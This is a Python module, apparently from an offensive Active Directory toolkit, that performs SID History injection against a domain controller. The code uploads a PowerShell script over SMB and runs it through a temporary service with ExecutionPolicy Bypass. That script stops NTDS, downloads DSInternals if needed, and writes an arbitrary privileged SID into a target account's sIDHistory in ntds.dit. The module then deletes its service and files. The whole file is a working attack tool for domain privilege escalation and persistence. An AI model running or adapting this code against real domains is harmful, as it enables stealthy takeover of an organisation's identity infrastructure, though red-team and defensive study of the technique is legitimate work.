"""
DSInternals SID History Injection via Remote Execution

Uses impacket to execute PowerShell commands on the DC via SCMR (Service Control Manager).
The PowerShell script uses DSInternals to modify ntds.dit offline, bypassing the
DRSAddSidHistory validations that prevent injecting privileged SIDs.

Flow:
1. Connect to DC via SMB
2. Create a temporary Windows service that runs a base64-encoded PowerShell script
3. The PS script stops NTDS, injects the SID via DSInternals, restarts NTDS
4. Poll for result file via SMB
5. Cleanup service and result file
"""

import logging
import time
import base64
import uuid
from typing import Optional, Tuple

from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, scmr


SERVICE_NAME = "__pySIDHist"
RESULT_FILE = "__pysidhistory_result.txt"
RESULT_PATH_WIN = f"C:\\Windows\\Temp\\{RESULT_FILE}"
RESULT_PATH_SHARE = f"Temp\\{RESULT_FILE}"
SCRIPT_FILE = "__pysidhistory_inject.ps1"
SCRIPT_PATH_WIN = f"C:\\Windows\\Temp\\{SCRIPT_FILE}"
SCRIPT_PATH_SHARE = f"Temp\\{SCRIPT_FILE}"
NTDS_DB_PATH = "C:\\Windows\\NTDS\\ntds.dit"
POLL_INTERVAL = 5
POLL_TIMEOUT = 300


class DSInternalsInjector:
    """
    Injects SID History into a target AD account by remotely executing
    DSInternals commands on the DC via impacket SCMR.
    """

    def __init__(self, dc_ip: str, domain: str, username: str, password: str,
                 lm_hash: str = '', nt_hash: str = '',
                 dsinternals_path: Optional[str] = None):
        self.dc_ip = dc_ip
        self.domain = domain
        self.username = username
        self.password = password
        self.lm_hash = lm_hash
        self.nt_hash = nt_hash
        self.dsinternals_path = dsinternals_path

        self.smb_connection: Optional[SMBConnection] = None
        self.scmr_rpc = None
        self.scmr_handle = None

    def connect(self) -> bool:
        """Establish SMB connection to the DC."""
        try:
            self.smb_connection = SMBConnection(self.dc_ip, self.dc_ip, timeout=30)
            self.smb_connection.login(
                self.username, self.password, self.domain,
                self.lm_hash, self.nt_hash
            )
            logging.debug(f"SMB connection established to {self.dc_ip}")
            return True
        except Exception as e:
            if 'STATUS_LOGON_FAILURE' in str(e) or 'STATUS_ACCESS_DENIED' in str(e):
                logging.error(f"SMB auth failed (need Domain Admin on the DC): {e}")
            else:
                logging.error(f"SMB connection failed: {e}")
            return False

    def _connect_scmr(self) -> bool:
        """Bind to the Service Control Manager via named pipe."""
        try:
            rpctransport = transport.SMBTransport(
                self.dc_ip, filename=r'\svcctl',
                smb_connection=self.smb_connection
            )
            self.scmr_rpc = rpctransport.get_dce_rpc()
            self.scmr_rpc.connect()
            self.scmr_rpc.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.scmr_rpc)
            self.scmr_handle = resp['lpScHandle']
            logging.debug("SCMR connection established")
            return True
        except Exception as e:
            logging.error(f"SCMR connection failed: {e}")
            return False

    def _build_powershell_script(self, target_sam: str, sid_to_inject: str) -> str:
        """
        Build the PowerShell script that:
        1. Ensures DSInternals module is available
        2. Stops NTDS
        3. Injects SID via Add-ADDBSidHistory
        4. Restarts NTDS
        5. Writes result to file
        """
        # Build DSInternals install/import block
        if self.dsinternals_path:
            # Module uploaded via SMB — import from local path
            dsinternals_setup = f"""
$modulePath = '{self.dsinternals_path}'
if (Test-Path $modulePath) {{
    Import-Module $modulePath -Force
}} else {{
    'FAILED: DSInternals module not found at {self.dsinternals_path}' | Out-File -FilePath '{RESULT_PATH_WIN}' -Encoding ASCII
    exit 1
}}
"""
        else:
            # Install DSInternals with Add-ADDBSidHistory support
            # Version 6.x removed this cmdlet, so we need version 4.x
            # Install to a custom path to avoid conflicts with existing versions
            dsinternals_setup = r"""
$targetVersion = '4.14'
$cmdletName = 'Add-ADDBSidHistory'
$customPath = 'C:\Windows\Temp\__DSInternals414'
$psd1Path = "$customPath\DSInternals\$targetVersion\DSInternals.psd1"

$imported = $false

# Try 1: Load from our custom isolated path (already downloaded)
if (Test-Path $psd1Path) {
    try {
        Import-Module $psd1Path -Force -DisableNameChecking -ErrorAction Stop
        if (Get-Command $cmdletName -ErrorAction SilentlyContinue) { $imported = $true }
    } catch {}
}

# Try 2: Download DSInternals 4.14 to isolated path
if (-not $imported) {
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        if (-not (Get-PackageProvider -Name NuGet -ListAvailable -ErrorAction SilentlyContinue)) {
            Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -ErrorAction Stop | Out-Null
        }
        if (-not (Test-Path $customPath)) { New-Item -ItemType Directory -Path $customPath -Force | Out-Null }
        Save-Module -Name DSInternals -RequiredVersion $targetVersion -Path $customPath -Force -ErrorAction Stop
        Import-Module $psd1Path -Force -DisableNameChecking -ErrorAction Stop
        if (Get-Command $cmdletName -ErrorAction SilentlyContinue) { $imported = $true }
    } catch {
        "FAILED: Cannot install DSInternals $targetVersion : $_" | Out-File -FilePath '""" + RESULT_PATH_WIN + r"""' -Encoding ASCII
        exit 1
    }
}

if (-not $imported) {
    "FAILED: $cmdletName not available after loading DSInternals $targetVersion" | Out-File -FilePath '""" + RESULT_PATH_WIN + r"""' -Encoding ASCII
    exit 1
}
"""

        script = f"""
$ErrorActionPreference = 'Stop'
$resultFile = '{RESULT_PATH_WIN}'
try {{
    {dsinternals_setup}

    # Stop NTDS service
    Stop-Service ntds -Force
    Start-Sleep -Seconds 2

    # Verify NTDS is stopped
    $svc = Get-Service ntds
    if ($svc.Status -ne 'Stopped') {{
        throw "NTDS service did not stop (status: $($svc.Status))"
    }}

    # Inject SID History via DSInternals
    $sidObj = New-Object System.Security.Principal.SecurityIdentifier('{sid_to_inject}')
    Add-ADDBSidHistory -SamAccountName '{target_sam}' -SidHistory $sidObj -DatabasePath '{NTDS_DB_PATH}' -Force

    # Restart NTDS
    Start-Service ntds
    Start-Sleep -Seconds 2

    # Verify NTDS restarted
    $svc = Get-Service ntds
    if ($svc.Status -eq 'Running') {{
        'SUCCESS' | Out-File -FilePath $resultFile -Encoding ASCII
    }} else {{
        "WARNING: Injection done but NTDS status is $($svc.Status)" | Out-File -FilePath $resultFile -Encoding ASCII
    }}

}} catch {{
    # Emergency: always restart NTDS
    try {{
        Start-Service ntds -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 3
    }} catch {{}}

    "FAILED: $_" | Out-File -FilePath $resultFile -Encoding ASCII
}}
"""
        return script

    def _encode_powershell(self, script: str) -> str:
        """Encode PowerShell script to base64 for -EncodedCommand."""
        encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')
        return encoded

    def _create_service(self, bin_path: str) -> bool:
        """Create a temporary Windows service that runs the given command."""
        try:
            # Check if service already exists and delete it
            try:
                resp = scmr.hROpenServiceW(self.scmr_rpc, self.scmr_handle, SERVICE_NAME)
                scmr.hRDeleteService(self.scmr_rpc, resp['lpServiceHandle'])
                scmr.hRCloseServiceHandle(self.scmr_rpc, resp['lpServiceHandle'])
                logging.debug(f"Cleaned up pre-existing {SERVICE_NAME} service")
                time.sleep(1)
            except Exception:
                pass

            # Create the service
            resp = scmr.hRCreateServiceW(
                self.scmr_rpc,
                self.scmr_handle,
                SERVICE_NAME,
                SERVICE_NAME,
                lpBinaryPathName=bin_path,
                dwStartType=scmr.SERVICE_DEMAND_START,
            )
            service_handle = resp['lpServiceHandle']
            logging.debug(f"Service '{SERVICE_NAME}' created")

            # Start the service — it will fail (exit quickly) but the command runs
            # The PowerShell stops NTDS which may kill our RPC connection,
            # causing a connection reset (errno 104). This is expected.
            try:
                scmr.hRStartServiceW(self.scmr_rpc, service_handle)
            except Exception as e:
                logging.debug(f"Service start returned (expected): {e}")

            try:
                scmr.hRCloseServiceHandle(self.scmr_rpc, service_handle)
            except Exception:
                pass
            return True

        except scmr.DCERPCException as e:
            logging.error(f"SCMR error creating service: {e}")
            return False
        except Exception as e:
            # Connection reset during service start is expected when NTDS stops
            err_str = str(e).lower()
            if 'reading from remote' in err_str or '104' in err_str or 'reset' in err_str:
                logging.debug(f"Connection lost after service start (expected): {e}")
                return True
            logging.error(f"Failed to create/start service: {e}")
            return False

    def _reconnect_smb(self) -> bool:
        """Reconnect SMB if the connection was lost (e.g. NTDS restart killed it)."""
        try:
            # Test if connection is still alive
            self.smb_connection.listPath('ADMIN$', 'Temp\\')
            return True
        except Exception:
            pass

        logging.debug("SMB connection lost, reconnecting...")
        try:
            self.smb_connection = SMBConnection(self.dc_ip, self.dc_ip, timeout=30)
            self.smb_connection.login(
                self.username, self.password, self.domain,
                self.lm_hash, self.nt_hash
            )
            logging.debug("SMB reconnected")
            return True
        except Exception as e:
            logging.debug(f"SMB reconnect failed: {e}")
            return False

    def _poll_result(self) -> Tuple[bool, str]:
        """Poll for the result file via SMB."""
        logging.debug(f"Polling for result file (timeout: {POLL_TIMEOUT}s)...")
        start = time.time()

        while time.time() - start < POLL_TIMEOUT:
            time.sleep(POLL_INTERVAL)
            try:
                # Reconnect SMB if needed (NTDS stop may have killed it)
                if not self._reconnect_smb():
                    elapsed = int(time.time() - start)
                    logging.debug(f"Cannot reconnect SMB yet ({elapsed}s elapsed)...")
                    continue

                # Try to read the result file from ADMIN$ share
                from io import BytesIO
                result_buf = BytesIO()
                self.smb_connection.getFile('ADMIN$', RESULT_PATH_SHARE, result_buf.write)
                result = result_buf.getvalue().decode('utf-8', errors='replace').strip()
                logging.debug(f"Result file content: {result}")

                if result.startswith('SUCCESS'):
                    return True, result
                elif result.startswith('FAILED') or result.startswith('WARNING'):
                    return False, result
                else:
                    return False, f"Unexpected result: {result}"

            except Exception:
                # File not yet created, keep polling
                elapsed = int(time.time() - start)
                logging.debug(f"Result file not ready ({elapsed}s elapsed)...")
                continue

        return False, "Timeout waiting for injection result"

    def _cleanup(self):
        """Remove the result file, script file, and the temporary service."""
        # Delete result file
        try:
            self.smb_connection.deleteFile('ADMIN$', RESULT_PATH_SHARE)
            logging.debug("Result file cleaned up")
        except Exception:
            logging.debug("Could not delete result file (may not exist)")

        # Delete script file
        try:
            self.smb_connection.deleteFile('ADMIN$', SCRIPT_PATH_SHARE)
            logging.debug("Script file cleaned up")
        except Exception:
            logging.debug("Could not delete script file (may not exist)")

        # Delete the service
        if self.scmr_rpc and self.scmr_handle:
            try:
                resp = scmr.hROpenServiceW(self.scmr_rpc, self.scmr_handle, SERVICE_NAME)
                scmr.hRDeleteService(self.scmr_rpc, resp['lpServiceHandle'])
                scmr.hRCloseServiceHandle(self.scmr_rpc, resp['lpServiceHandle'])
                logging.debug(f"Service '{SERVICE_NAME}' deleted")
            except Exception:
                logging.debug("Could not delete service (may not exist)")

    def _emergency_restart_ntds(self):
        """Emergency NTDS restart if something goes wrong during polling/timeout."""
        print("[!] Attempting emergency NTDS restart...")
        try:
            self._reconnect_smb()
            self._connect_scmr()
            cmd = 'cmd.exe /c powershell.exe -NonInteractive -Command "Start-Service ntds -ErrorAction SilentlyContinue"'
            self._create_service(cmd)
            time.sleep(10)
            logging.warning("Emergency NTDS restart command sent")
        except Exception as e:
            logging.error(f"Emergency NTDS restart failed: {e}")

    def inject(self, target_sam: str, sid_to_inject: str) -> Tuple[bool, str]:
        """
        Perform the full SID History injection.

        Args:
            target_sam: sAMAccountName of the target account
            sid_to_inject: SID string to inject into sIDHistory

        Returns:
            Tuple of (success: bool, message: str)
        """
        # Step 1: Connect
        if not self.smb_connection:
            if not self.connect():
                return False, "SMB connection failed"

        if not self._connect_scmr():
            return False, "SCMR connection failed"

        # Step 2: Build PowerShell script and upload via SMB
        ps_script = self._build_powershell_script(target_sam, sid_to_inject)

        try:
            from io import BytesIO
            script_bytes = ps_script.encode('utf-8')
            self.smb_connection.putFile('ADMIN$', SCRIPT_PATH_SHARE,
                                        BytesIO(script_bytes).read)
            logging.debug(f"Uploaded injection script ({len(script_bytes)} bytes)")
        except Exception as e:
            err = str(e)
            if 'STATUS_ACCESS_DENIED' in err:
                return False, "Cannot write to ADMIN$ share (need Domain Admin privileges)"
            return False, f"Failed to upload script: {e}"

        # Step 3: Create service that runs the uploaded script
        # Short BinPath avoids Windows service command length limits
        exec_cmd = (f'cmd.exe /c powershell.exe -NonInteractive -ExecutionPolicy Bypass '
                    f'-File "{SCRIPT_PATH_WIN}"')
        if not self._create_service(exec_cmd):
            return False, "Failed to create injection service"

        print("[*] NTDS service stopping, injecting SID via DSInternals...")
        logging.debug("Injection service started, waiting for completion...")

        # Step 4: Poll for result
        try:
            success, message = self._poll_result()
        except Exception as e:
            logging.error(f"Error during result polling: {e}")
            self._emergency_restart_ntds()
            success, message = False, f"Polling error: {e}"

        # Step 5: If timeout, emergency restart
        if not success and "Timeout" in message:
            self._emergency_restart_ntds()

        # Step 6: Reconnect and cleanup
        self._reconnect_smb()
        try:
            self._connect_scmr()
        except Exception:
            pass
        self._cleanup()

        return success, message

    def disconnect(self):
        """Close all connections."""
        if self.scmr_rpc:
            try:
                if self.scmr_handle:
                    scmr.hRCloseServiceHandle(self.scmr_rpc, self.scmr_handle)
                self.scmr_rpc.disconnect()
            except Exception:
                pass
            self.scmr_rpc = None
            self.scmr_handle = None

        if self.smb_connection:
            try:
                self.smb_connection.close()
            except Exception:
                pass
            self.smb_connection = None
